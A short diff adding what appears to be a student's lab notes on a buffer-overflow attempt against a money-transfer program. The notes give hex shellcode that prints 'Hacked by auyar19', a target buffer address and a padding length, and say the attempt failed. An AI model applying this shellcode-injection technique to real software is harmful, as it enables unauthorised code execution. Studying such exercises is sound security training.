@@ -1,0 +1,8 @@
+First I created the resulting shell code that generates the string "Hacked By auyar19" which is 
+\xeb\x15\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x12\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe6\xff\xff\xff\x48\x61\x63\x6b\x65\x64\x20\x62\x79\x20\x61\x75\x79\x61\x72\x31\x39\x00
+
+Then to use my shell code I tried to put the shell code after the put instruction of transfer money. 
+
+I found the address where the username buffer which was \x00\xc0\x04\x08 
+
+After feeding the shell code as input, I added sufficent paddings (61 A characters) and tried to run it but it didin't work. 
